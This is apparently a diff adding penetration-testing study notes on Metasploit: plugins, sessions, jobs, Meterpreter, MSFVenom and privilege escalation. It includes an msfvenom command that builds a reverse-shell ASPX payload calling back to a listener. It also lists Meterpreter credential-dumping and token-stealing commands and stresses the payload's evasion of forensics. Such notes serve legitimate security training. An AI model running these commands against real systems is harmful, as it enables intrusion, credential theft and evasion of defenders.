@@ -1148,3 +1148,110 @@ creds -R           # Set RHOSTS from found logins
 ```
 
 ---
+
+## Plugins 🔌
+- Plugins are third-party software integrated within the Metasploit framework 🤝
+- They enhance functionality by bringing external tools into msfconsole 🧰
+- Plugins work directly with the API to manipulate the framework 🔄
+- Can automate repetitive tasks, add new commands, and extend functionality ✨
+
+### Using Plugins 🚀
+- Default location: `/usr/share/metasploit-framework/plugins` 📁
+- Load with: `load plugin_name` (Example: `load nessus`) ⚙️
+- Each plugin has its own set of commands (view with `plugin_help`) 📝
+- If plugin is not installed properly, you'll receive an error message ❌
+
+### Installing New Plugins 📥
+- Can be installed by placing .rb files in the plugins directory 💎
+- Example of community plugins: DarkOperator's Metasploit-Plugins 🔥
+- Process: 
+  1. Download plugin files 📥
+  2. Copy to plugins directory 📋
+  3. Set proper permissions 🔒
+  4. Load via msfconsole 🚀
+
+### Popular Plugins 🌟
+- nMap (pre-installed) 🗺️
+- NexPose (pre-installed) 🔍
+- Nessus (pre-installed) 🔎
+- Mimikatz (pre-installed V.1) 🔑
+- Stdapi (pre-installed) 📊
+- Darkoperator's plugins 🧩
+
+## Sessions 💻
+- Allow managing multiple modules simultaneously 🔄
+- Create dedicated control interfaces for deployed modules 🎮
+- Sessions can be backgrounded and still continue to run ⏱️
+- Can switch between sessions and link different modules 🔀
+
+### Managing Sessions 🎛️
+- Background session: `CTRL+Z` or `background`/`bg` command ⏯️
+- List active sessions: `sessions` command 📋
+- Interact with specific session: `sessions -i [session_number]` 🎯
+- Particularly useful for running post-exploitation modules 🧪
+
+## Jobs 🏃‍♂️
+- Background tasks that continue running even if sessions die 🔄
+- Useful when needing to free up ports for other modules 🔌
+- View jobs: `jobs -l` 👀
+- Kill specific job: `jobs -k [job_id]` ☠️
+- Kill all jobs: `jobs -K` 💥
+- Run exploit as background job: `exploit -j` 🏎️
+
+## Meterpreter 🦾
+- Advanced multi-functional payload 💪
+- Uses DLL injection for stable connections 💉
+- Resides entirely in memory (leaves no traces on hard drive) 👻
+- Difficult to detect with conventional forensic techniques 🕵️‍♀️
+
+### Meterpreter Features 🌟
+- **Stealthy** 🥷: Resides in memory, no disk writing, can migrate between processes
+- **Powerful** 💪: Uses channelized communication with AES encryption
+- **Extensible** 🧩: Features can be added at runtime without rebuilding
+
+### Key Meterpreter Commands 🎮
+- `help`: Shows available commands 📚
+- `getuid`: Display current user 👤
+- `hashdump`: Extract password hashes 🔑
+- `lsa_dump_sam`: Dump Security Account Manager database 📂
+- `lsa_dump_secrets`: Dump LSA secrets 🔐
+- `ps`: List running processes 📊
+- `migrate [PID]`: Move to different process 🦅
+- `steal_token [PID]`: Impersonate another user 🎭
+- `background`/`bg`: Background current session ⏪
+
+### Practical Usage Example 🎯
+1. Scan target with nmap 🔍
+2. Identify vulnerable service (e.g., IIS 6.0) 🎯
+3. Search for and configure appropriate exploit ⚙️
+4. Execute and receive Meterpreter shell 🐚
+5. Run local exploit suggester to find privilege escalation paths 🪜
+6. Execute privilege escalation exploit to gain SYSTEM access 👑
+
+## MSFVenom 🐍
+- Successor of MSFPayload and MSFEncode 👑
+- Creates customized payloads for different architectures and platforms 🏗️
+- Can encode shellcode to avoid bad characters and improve stability 🧬
+
+### Creating Payloads 💣
+- Syntax: `msfvenom -p [payload] [options]` ⌨️
+- Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx` 📝
+- Need to set up listener with multi/handler to catch connections 🎣
+
+### Local Exploit Suggester 🕵️‍♂️
+- Post-exploitation module to identify privilege escalation opportunities 🔍
+- Usage:
+  1. Background current session ⏪
+  2. Load module: `use post/multi/recon/local_exploit_suggester` 🔧
+  3. Set session number: `set SESSION [number]` 🔢
+  4. Run module: `run` 🏃
+  5. Select and try suggested exploits 🎯
+
+## General Tips 💡
+- Always close sessions and kill jobs when finished 🧹
+- Backgrounded sessions and jobs consume resources 🔋
+- Encode payloads for better success rates 🎯
+- Use post-exploitation modules for efficient enumeration 📊
+- Consider security implications of leaving traces on target systems 🚨
+- Remember to document your findings for reporting 📝
+- Practice in legal environments only! 🔒
